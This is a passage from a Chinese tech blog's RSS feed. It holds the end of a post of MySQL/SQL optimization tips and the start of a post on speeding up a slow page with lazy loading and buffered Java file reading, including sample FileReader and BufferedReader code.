&lt;li&gt;&lt;p&gt;全模糊查询是无法优化的，一定要使用的话建议使用搜索引擎。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;33、统一SQL语句的写法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于以下两句SQL语句， 程序员认为是相同的，数据库查询优化器认为是不同的。&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from user;select * From USER;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这都是很常见的写法，也很少有人会注意，就是表名大小写不一样而已。然而，查询解析器认为这是两个不同的SQL语句，要解析两次，生成两个不同的执行计划，作为一名严谨的Java开发工程师，应该保证两个一样的SQL语句，不管在任何地方都是一样的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;34、不要把SQL语句写得太复杂&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;经常听到有人吹牛逼，我写了一个800行的SQL语句，逻辑感超强，我们还开会进行了SQL讲解，大家都投来了崇拜的目光。。。&lt;/p&gt;
&lt;p&gt;一般来说，嵌套子查询、或者是3张表关联查询还是比较常见的，但是，如果超过3层嵌套的话，查询优化器很容易给出错误的执行计划，影响SQL效率。SQL执行计划是可以被重用的，SQL越简单，被重用的概率越大，生成执行计划也是很耗时的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;35、将大的DELETE，UPDATE、INSERT 查询变成多个小查询&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;能写一个几十行、几百行的SQL语句是不是显得逼格很高？然而，为了达到更好的性能以及更好的数据控制，你可以将他们变成多个小查询。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;36、关于临时表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.避免频繁创建和删除临时表，以减少系统表资源的消耗；&lt;/p&gt;
&lt;p&gt;2.在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log；&lt;/p&gt;
&lt;p&gt;3.如果数据量不大，为了缓和系统表的资源，应先create table，然后insert；&lt;/p&gt;
&lt;p&gt;4.如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除。先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;37、使用explain分析你SQL执行计划&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）type&lt;/p&gt;
&lt;p&gt;1.system：表仅有一行，基本用不到；&lt;/p&gt;
&lt;p&gt;2.const：表最多一行数据配合，主键查询时触发较多；&lt;/p&gt;
&lt;p&gt;3.eq_ref：对于每个来自于前面的表的行组合，从该表中读取一行。这可能是最好的联接类型，除了const类型；&lt;/p&gt;
&lt;p&gt;4.ref：对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这张表中读取；&lt;/p&gt;
&lt;p&gt;5.range：只检索给定范围的行，使用一个索引来选择行。当使用=、&amp;lt;&amp;gt;、&amp;gt;、&amp;gt;=、&amp;lt;、&amp;lt;=、IS NULL、&amp;lt;=&amp;gt;、BETWEEN或者IN操作符，用常量比较关键字列时，可以使用range；&lt;/p&gt;
&lt;p&gt;6.index：该联接类型与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小；&lt;/p&gt;
&lt;p&gt;7.all：全表扫描；&lt;/p&gt;
&lt;p&gt;8.性能排名：system &amp;gt; const &amp;gt; eq_ref &amp;gt; ref &amp;gt; range &amp;gt; index &amp;gt; all。&lt;/p&gt;
&lt;p&gt;9.实际sql优化中，最后达到ref或range级别。&lt;/p&gt;
&lt;p&gt;（2）Extra常用关键字&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Using index：只从索引树中获取信息，而不需要回表查询；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Using where：WHERE子句用于限制哪一个行匹配下一个表或发送到客户。除非你专门从表中索取或检查所有行，如果Extra值不为Using where并且表联接类型为ALL或index，查询可能会有一些错误。需要回表查询。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Using temporary：mysql常建一个临时表来容纳结果，典型情况如查询包含可以按不同情况列出列的GROUP BY和ORDER BY子句时；&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;38、读写分离与分库分表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当数据量达到一定的数量之后，限制数据库存储性能的就不再是数据库层面的优化就能够解决的；这个时候往往采用的是读写分离与分库分表同时也会结合缓存一起使用，而这个时候数据库层面的优化只是基础。&lt;/p&gt;
&lt;p&gt;读写分离适用于较小一些的数据量；分表适用于中等数据量；而分库与分表一般是结合着用，这就适用于大数据量的存储了，这也是现在大型互联网公司解决数据存储的方法之一。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;39、使用合理的分页方式以提高分页的效率&lt;/strong&gt;&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,name from user limit 100000, 20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用上述SQL语句做分页的时候，随着表数据量的增加，直接使用limit语句会越来越慢。&lt;br&gt;此时，可以通过取前一页的最大ID，以此为起点，再进行limit操作，效率提升显著。&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,name from user where id&amp;gt; 100000 limit 20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;40、尽量控制单表数据量的大小，建议控制在500万以内。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;500万并不是MySQL数据库的限制，过大会造成修改表结构，备份，恢复都会有很大的问题。&lt;br&gt;可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;41、谨慎使用Mysql分区&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;表分区表在物理上表现为多个文件，在逻辑上表现为一个表；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;谨慎选择分区键，跨分区查询效率可能更低；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;建议采用物理分表的方式管理大数据。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;42、尽量做到冷热数据分离，减小表的宽度&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Mysql限制每个表最多存储4096列，并且每一行数据的大小不能超过65535字节。&lt;/p&gt;
&lt;p&gt;减少磁盘IO,保证热数据的内存缓存命中率（表越宽，把表装载进内存缓冲池时所占用的内存也就越大,也会消耗更多的IO）；&lt;/p&gt;
&lt;p&gt;更有效的利用缓存，避免读入无用的冷数据；&lt;/p&gt;
&lt;p&gt;经常一起使用的列放到一个表中（避免更多的关联操作）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;43、禁止在表中建立预留字段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.预留字段的命名很难做到见名识义；&lt;/p&gt;
&lt;p&gt;2.预留字段无法确认存储的数据类型，所以无法选择合适的类型；&lt;/p&gt;
&lt;p&gt;3.对预留字段类型的修改，会对表进行锁定；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;44、禁止在数据库中存储图片，文件等大的二进制数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通常文件很大，会短时间内造成数据量快速增长，数据库进行数据库读取时，通常会进行大量的随机IO操作，文件很大时，IO操作很耗时。&lt;/p&gt;
&lt;p&gt;通常存储于文件服务器，数据库只存储文件地址信息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;45、建议把BLOB或是TEXT列分离到单独的扩展表中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Mysql内存临时表不支持TEXT、BLOB这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。而且对于这种数据，Mysql还是要进行二次查询，会使sql性能变得很差，但是不是说一定不能使用这样的数据类型。&lt;/p&gt;
&lt;p&gt;如果一定要使用，建议把BLOB或是TEXT列分离到单独的扩展表中，查询时一定不要使用select * 而只需要取出必要的列，不需要TEXT列的数据时不要对该列进行查询。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;46、TEXT或BLOB类型只能使用前缀索引&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为MySQL对索引字段长度是有限制的，所以TEXT类型只能使用前缀索引，并且TEXT列上是不能有默认值的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;47、一些其它优化方式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）当只需要一条数据的时候，使用limit 1：&lt;br&gt;limit 1可以避免全表扫描，找到对应结果就不会再继续扫描了。&lt;/p&gt;
&lt;p&gt;（2）如果排序字段没有用到索引，就尽量少排序&lt;/p&gt;
&lt;p&gt;（3）所有表和字段都需要添加注释使用comment从句添加表和列的备注，从一开始就进行数据字典的维护。&lt;/p&gt;
&lt;p&gt;（4）SQL书写格式，关键字大小保持一致，使用缩进。&lt;/p&gt;
&lt;p&gt;（5）修改或删除重要数据前，要先备份。&lt;/p&gt;
&lt;p&gt;（6）很多时候用 exists 代替 in 是一个好的选择&lt;/p&gt;
&lt;p&gt;（7）where后面的字段，留意其数据类型的隐式转换。&lt;/p&gt;
&lt;p&gt;（8）尽量把所有列定义为NOT NULL:&lt;br&gt;NOT NULL列更节省空间，NULL列需要一个额外字节作为判断是否为 NULL的标志位。NULL列需要注意空指针问题，NULL列在计算和比较的时候，需要注意空指针问题。&lt;/p&gt;
&lt;p&gt;（9）伪删除设计&lt;/p&gt;
&lt;p&gt;（10）索引不适合建在有大量重复数据的字段上，比如性别，排序字段应创建索引&lt;/p&gt;
&lt;p&gt;（11）尽量避免使用游标：&lt;br&gt;因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。&lt;/p&gt;
&lt;p&gt;转载自：&lt;a href=&#34;https://mp.weixin.qq.com/s/zGneQEY8_P3nL0nGI8tCFg&#34;&gt;哪吒编程&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://erik.xyz/2024/06/12/loading-zero-copy/</guid>
            <title>使用懒加载 + 零拷贝后，程序的秒开率提升至99.99%</title>
            <link>https://erik.xyz/2024/06/12/loading-zero-copy/</link>
            <category>web</category>
            <category>web前端</category>
            <category>web优化</category>
            <pubDate>Wed, 12 Jun 2024 10:00:56 +0800</pubDate>
            <description><![CDATA[ &lt;link rel=&#34;stylesheet&#34; class=&#34;aplayer-secondary-style-marker&#34; href=&#34;/assets/css/APlayer.min.css&#34;&gt;&lt;script src=&#34;/assets/js/APlayer.min.js&#34; class=&#34;aplayer-secondary-script-marker&#34;&gt;&lt;/script&gt;&lt;h4 id=&#34;一、5秒钟加载一个页面的真相&#34;&gt;&lt;a href=&#34;#一、5秒钟加载一个页面的真相&#34; class=&#34;headerlink&#34; title=&#34;一、5秒钟加载一个页面的真相&#34;&gt;&lt;/a&gt;一、5秒钟加载一个页面的真相&lt;/h4&gt;&lt;p&gt;今天在修改前端页面的时候，发现程序中有一个页面的加载速度很慢，差不多需要5秒，这其实是难以接受的，我也不知道为什么上线这么长时间了，没人提过这个事儿。&lt;/p&gt;
&lt;p&gt;我记得有一个词儿，叫秒开率。&lt;br&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br&gt;秒开率是指能够在1秒内完成页面的加载。&lt;br&gt;&lt;img src=&#34;/img/2024/20240501.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;查询的时候，会访问后台数据库，查询前20条数据，按道理来说，这应该很快才对。追踪代码，看看啥问题，最后发现问题有三：&lt;/p&gt;
&lt;p&gt;1.表中有一个BLOB大字段，存储着一个PDF模板，也就是上图中的运费模板；&lt;/p&gt;
&lt;p&gt;2.查询后会将这个PDF模板存储到本地磁盘点&lt;/p&gt;
&lt;p&gt;3.击线上显示，会读取本地的PDF模板，通过socket传到服务器。&lt;/p&gt;
&lt;h5 id=&#34;大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。&#34;&gt;&lt;a href=&#34;#大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。&#34; class=&#34;headerlink&#34; title=&#34;大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。&#34;&gt;&lt;/a&gt;大字段批量查询、批量文件落地、读取大文件并进行网络传输，不慢才怪，这一顿骚操作，5秒能加载完毕，已经烧高香了。&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;/img/2024/20240502.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;二、优化四步走&#34;&gt;&lt;a href=&#34;#二、优化四步走&#34; class=&#34;headerlink&#34; title=&#34;二、优化四步走&#34;&gt;&lt;/a&gt;二、优化四步走&lt;/h4&gt;&lt;h5 id=&#34;1、“懒加载”&#34;&gt;&lt;a href=&#34;#1、“懒加载”&#34; class=&#34;headerlink&#34; title=&#34;1、“懒加载”&#34;&gt;&lt;/a&gt;1、“懒加载”&lt;/h5&gt;&lt;p&gt;经过调查发现，这个PDF模板只有在点击运费模板按钮时才会使用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;优化1： 在点查询按钮时，不查询PDF模板；&lt;/li&gt;
&lt;li&gt;优化2： 点击运费模板时，根据uuid去查询，这样既能触发索引，也不用按时间排序，只是查询单条，速度快了很多很多，我愿称你为“懒加载”。&lt;/li&gt;
&lt;li&gt;优化3： 通过异步，将文件保存到磁盘中。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/20240503.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2、线上显示 = 就读取一个文件，为什么会慢呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打开代码一看，居然是通过FileReader读取的，我了个乖乖~这有什么问题吗？&lt;/p&gt;
&lt;p&gt;都是从百度拷贝过来的，百度还会有错吗？而且也测试了，没问题啊。&lt;/p&gt;
&lt;p&gt;嗯，对，是没问题，是可以实现需求，可是，为什么用这个？不知道。更别说效率问题了~&lt;/p&gt;
&lt;p&gt;优化4：通过缓冲流读取文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/2024/20240504.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;三、先从上帝视角，了解一下啥子是IO流&#34;&gt;&lt;a href=&#34;#三、先从上帝视角，了解一下啥子是IO流&#34; class=&#34;headerlink&#34; title=&#34;三、先从上帝视角，了解一下啥子是IO流&#34;&gt;&lt;/a&gt;三、先从上帝视角，了解一下啥子是IO流&lt;/h4&gt;&lt;p&gt;Java I/O (Input/Output) 是对传统 I/O 操作的封装，它是以流的形式来操作数据的。&lt;/p&gt;
&lt;p&gt;1.InputStream代表一个输入流，它是一个抽象类，不能被实例化。InputStream定义了一些通用方法，如read()和skip()等，用于从输入流中读取数据；&lt;/p&gt;
&lt;p&gt;2.OutputStream代表一个输出流，它也是一个抽象类，不能被实例化。OutputStream定义了一些通用方法，如write()和flush()等，用于向输出流中写入数据；&lt;/p&gt;
&lt;p&gt;3.除了字节流，Java还提供字符流，字符流类似于字节流，不同之处在于字符流是按字符读写数据，而不是按字节。Java中最基本的字符流是Reader和Writer，它们是基于InputStream和OutputStream的转换类，用于完成字节流与字符流之间的转换。&lt;/p&gt;
&lt;p&gt;4.BufferedInputStream和BufferedOutputStream是I/O包中提供的缓冲输入输出流。它们可以提高I/O操作的效率，具有较好的缓存机制，能够减少磁盘操作，缩短文件传输时间。使用BufferedInputStream和 BufferedOutputStream进行读取和写入时，Java会自动调整缓冲区的大小，使其能够适应不同的数据传输速度。&lt;/p&gt;
&lt;p&gt;5.可以读取或写入 Java对象的流，比较典型的对象流包括ObjectInputStream 和ObjectOutputStream，将Java对象转换为字节流进行传输或存储；&lt;br&gt;&lt;img src=&#34;/img/2024/20240505.webp&#34; alt=&#34;erik.xyz&#34;&gt;&lt;/p&gt;
&lt;p&gt;在上一篇&lt;a href=&#34;2024/05/06/index-asynchrony-landing/&#34;&gt;《增加索引+异步+不落地后，从12h优化到15min》&lt;/a&gt;中，提到了4种优化方式，数据库优化、复用优化、并行优化、算法优化。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;其中Buffered缓冲流就属于复用优化的一种，这个页面的查询完全可以通过复用优化优化一下。&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;四、写个栗子，测试一下&#34;&gt;&lt;a href=&#34;#四、写个栗子，测试一下&#34; class=&#34;headerlink&#34; title=&#34;四、写个栗子，测试一下&#34;&gt;&lt;/a&gt;四、写个栗子，测试一下&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;1、通过字符输入流FileReader读取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;FileReader连readLine()方法都没有，我也是醉了~&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;private static int readFileByReader(String filePath) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int result = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try (Reader reader = new FileReader(filePath)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        int value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        while ((value = reader.read()) != -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result += value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&amp;quot;readFileByReader异常：&amp;quot; + e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2、通过缓冲流BufferedReader读取&lt;/strong&gt;&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;private static String readFileByBuffer(String filePath) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    StringBuilder builder = new StringBuilder();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String data = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        while ((data = reader.readLine())!= null)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            builder.append(data);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&amp;quot;readFileByReader异常：&amp;quot; + e);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return builder+&amp;quot;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;通过循环模拟了150000个文件进行测试，FileReader耗时8136毫秒，BufferedReader耗时6718毫秒，差不多相差1秒半的时间，差距还是相当大的，俗话说得好，水滴石穿。&lt;/p&gt;
&lt;p&gt;同样是read方法，只不过是包了一层，有啥不同呢？&lt;/p&gt;
&lt;p&gt;BufferedReader 是一个缓冲字符输入流，可以对 FileRead 进行包装，提供了一个缓存数组，将数据按照一定规则读取到缓存区中，输入流每次读取文件数据时都需要将数据进行字符编码，而 BufferedReader 的出现，降低了输入流访问数据源的次数，将一定大小的数据一次读取到缓存区并进行字符编码，从而提高 IO 的效率。&lt;/p&gt;
&lt;p&gt;如果没有缓冲，每次调用 read() 或 readLine() 都可能导致从文件中读取字节，转换为字符，然后返回，这可能非常低效。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;就像取快递一样，在取快递的时候，肯定是想一次性的取完，避免再来一趟。&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;FileReader就相当于一件一件的取，乐此不疲；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;BufferedReader就相当于，你尽可能多的拿你的快递，可是这也有个极限，比如你一次只能拿5件快递，这个 5 就相当于缓冲区，效率上，提升数倍。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对 FileRead 进行包装变成了BufferedReader缓冲字符输入流，其实，Java IO流就是最典型的装饰器模式，装饰器模式通过组合替代继承的方式在不改变原始类的情况下添加增强功能，主要解决继承关系过于复杂的问题，之前整理过一篇装饰器模式，这里就不论述了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3、再点进源码瞧瞧。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（1）FileReader.read()源码很简单，就是直接读取&lt;/strong&gt;&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public int read(char cbuf[], int off, int len) throws IOException &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   return in.read(cbuf, off, len);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（2）BufferedReader.read()的源码就较为复杂了，看一下它的核心方法&lt;/strong&gt;&lt;br&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span 